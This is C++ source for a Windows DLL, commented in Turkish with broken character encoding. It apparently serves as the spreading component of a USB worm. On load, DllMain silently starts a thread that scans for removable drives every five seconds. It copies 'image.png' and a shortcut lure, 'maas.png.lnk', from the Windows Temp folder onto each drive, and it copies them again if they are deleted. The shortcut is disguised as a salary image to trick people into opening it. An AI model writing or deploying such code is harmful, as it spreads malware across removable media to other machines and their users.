#include <windows.h>
#include <tchar.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <iostream> // Debug i�in

// USB s�r�c�lerini alg�lay�p listeleyecek fonksiyon
std::vector<std::wstring> GetUsbDrives() {
    std::vector<std::wstring> usbDrives;
    TCHAR szDrive[] = _T("A:\\\\");

    // S�r�c�leri A: Z: aras� kontrol et
    for (int i = 0; i < 26; i++) {
        szDrive[0] = 'A' + i;
        DWORD dwAttrib = GetFileAttributes(szDrive);

        // E�er ge�erli bir s�r�c� ve dizinse
        if (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
            // Sadece USB s�r�c�s�n� kontrol et
            if (GetDriveType(szDrive) == DRIVE_REMOVABLE) {
                usbDrives.push_back(szDrive);
            }
        }
    }

    return usbDrives;
}

// Dosya kopyalama fonksiyonu (dosyay� USB s�r�c�s�ne kopyalar)
bool CopyFileToUsbDrive(const std::wstring& usbDrive, const std::wstring& filePath, const std::wstring& fileName) {
    if (filePath.empty()) {
        std::wcerr << fileName << L" bulunamad�!" << std::endl;
        return false;
    }

    // USB'deki hedef yol
    std::wstring destPath = usbDrive + L"\\\\" + fileName;

    // Dosya kopyalama i�lemi
    bool success = CopyFile(filePath.c_str(), destPath.c_str(), FALSE);
    if (!success) {
        std::wcerr << fileName << L" kopyalama hatas�: " << GetLastError() << std::endl;
    }

    return success;
}

// Dosyan�n var olup olmad���n� kontrol etme
bool IsFilePresent(const std::wstring& usbDrive, const std::wstring& fileName) {
    std::wstring destPath = usbDrive + L"\\\\" + fileName;
    return GetFileAttributes(destPath.c_str()) != INVALID_FILE_ATTRIBUTES;
}

// Dosyan�n bulundu�u yolu belirleme fonksiyonu
std::wstring FindFile(const std::wstring& fileName) {
    // Dosya C:\\Windows\\Temp alt�nda aranacak
    std::wstring tempPath = L"C:\\\\Windows\\\\Temp\\\\" + fileName;

    if (GetFileAttributes(tempPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        return tempPath;
    }

    // Dosya bulunamazsa bo� bir string d�nd�r
    return L"";
}

// USB s�r�c�lerini s�rekli taray�p dosya kopyalama i�lemi yapan fonksiyon
void MonitorUsbDrives() {
    const std::wstring fileNames[] = { L"image.png", L"maas.png.lnk" };

    while (true) {
        // USB s�r�c�lerini al
        std::vector<std::wstring> usbDrives = GetUsbDrives();

        for (const auto& usbDrive : usbDrives) {
            bool allCopied = true;

            // Dosyalar� kopyala
            for (const auto& fileName : fileNames) {
                std::wstring filePath = FindFile(fileName);

                // E�er dosya mevcut de�ilse, tekrar kopyala
                if (!IsFilePresent(usbDrive, fileName)) {
                    if (!CopyFileToUsbDrive(usbDrive, filePath, fileName)) {
                        allCopied = false; // E�er bir kopyalama ba�ar�s�zsa
                    }
                }
            }

            if (allCopied) {
                std::wcout << L"T�m dosyalar " << usbDrive << L" s�r�c�s�ne kopyaland�." << std::endl;
            }
        }

        // 5 saniye bekle (USB s�r�c�lerini yeniden taramadan �nce)
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // USB s�r�c�lerini s�rekli taramak i�in MonitorUsbDrives fonksiyonunu ba�lat
        std::thread monitorThread(MonitorUsbDrives);
        monitorThread.detach(); // Thread'i ay�rarak ana i� par�ac���ndan ba��ms�z �al��mas�n� sa�la
    }
    return TRUE;
}
